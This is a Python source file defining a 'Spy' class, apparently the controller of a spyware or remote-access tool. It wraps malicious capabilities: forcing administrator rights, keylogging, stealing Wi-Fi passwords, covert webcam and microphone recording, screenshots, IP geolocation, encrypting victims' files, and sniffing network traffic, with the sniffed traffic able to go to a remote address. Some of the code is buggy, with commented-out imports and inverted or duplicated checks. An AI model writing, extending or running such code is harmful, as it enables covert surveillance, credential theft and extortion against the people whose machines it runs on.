import os
from typing import Optional, Tuple
from spying.KeyLogger import KeyLogger
from spying.Wifi import steal_passwords
import spying.admin
# from spying.video import VideoRecorder, AudioRecorder, get_available_cameras
from pyautogui import screenshot
import geocoder
from spying.encrypt import Encryptor
from spying.snnifing import netstart, filestart, stop_sniffing


class Spy:
    def __init__(self):
        if not admin.make_admin():
           exit()
        self.keyLogger: Optional[KeyLogger] = None
        self.video_recorder: Optional[VideoRecorder] = None
        self.audio_recorder: Optional[AudioRecorder] = None
        self.encryptor: Optional[Encryptor] = None

    @staticmethod
    def steal_passwords() -> str:
        return steal_passwords()

    def start_keylogger(self) -> bool:
        if self.keyLogger:
            return False
        self.keyLogger = KeyLogger()
        self.keyLogger.start()
        return True

    def stop_keylogger(self) -> bool:
        if not self.keyLogger:
            return False
        self.keyLogger.stop()
        return True

    def start_video_audio_record(self, camindex=None) -> bool:
        if self.audio_recorder or self.audio_recorder:
            return False
        self.video_recorder = VideoRecorder(camindex=camindex)
        self.audio_recorder = AudioRecorder()
        self.video_recorder.start()
        self.audio_recorder.start()
        return True

    def start_video_recording(self, filename=None, camindex=None) -> bool:
        if self.video_recorder:
            return False
        self.video_recorder = VideoRecorder(filename, camindex=camindex) if filename else VideoRecorder(camindex=camindex)
        self.video_recorder.start()
        return True

    def start_audio_recording(self, filename=None) -> bool:
        if self.audio_recorder:
            return False
        self.audio_recorder = AudioRecorder(filename) if filename else AudioRecorder()
        self.audio_recorder.start()
        return True

    def stop_video_audio_record(self, filename="video") -> bool:
        if (not self.audio_recorder) or (not self.audio_recorder):
            return False
        self.video_recorder.stop_merge(self.audio_recorder, filename)
        return True

    def stop_video_recording(self) -> bool:
        if not self.video_recorder:
            return False
        return self.video_recorder.stop()

    def stop_audio_recording(self) -> bool:
        if self.audio_recorder:
            return False
        return self.audio_recorder.stop()

    @staticmethod
    def get_available_cameras() -> str:
        return get_available_cameras()

    @staticmethod
    def get_user() -> str:
        return os.getlogin()

    @staticmethod
    def get_computer() -> str:
        return os.environ['COMPUTERNAME']

    @staticmethod
    def take_screenshot(path: str) -> bool:
        """ taking a screenshot and save it in the given path.
        :param path: where to save the file
        :return: whether succeeded
        """
        if not path.endswith(".jpg"):
            path += ".jpg"
        try:
            image = screenshot()
            image.save(path)
            image.close()
            # print("A screenshot has been taken")
        except OSError:
            # print(f"Couldn't take screenshot because {e}")
            return False
        return True

    @staticmethod
    def get_location():
        return geocoder.ip('me').json

    @property
    def encryption_key(self):
        if self.encryptor:
            return self.encryptor.encryption_key
        self.encryptor = Encryptor()
        return self.encryptor.encryption_key

    def encrypt(self, path: str) -> Tuple[list, list]:
        return self.encryptor.encrypt(path)

    def decrypt(self, path: str, key=None) -> Tuple[list, list]:
        if not key:
            return self.encryptor.decrypt(path)
        e = Encryptor(key)

    @staticmethod
    def start_sniffing_to_file(path: str) -> bool:
        return filestart(path)

    @staticmethod
    def start_sniffing_on_net(address: Tuple[str, int]):
        return netstart(address)

    @staticmethod
    def stop_sniffing():
        return stop_sniffing()

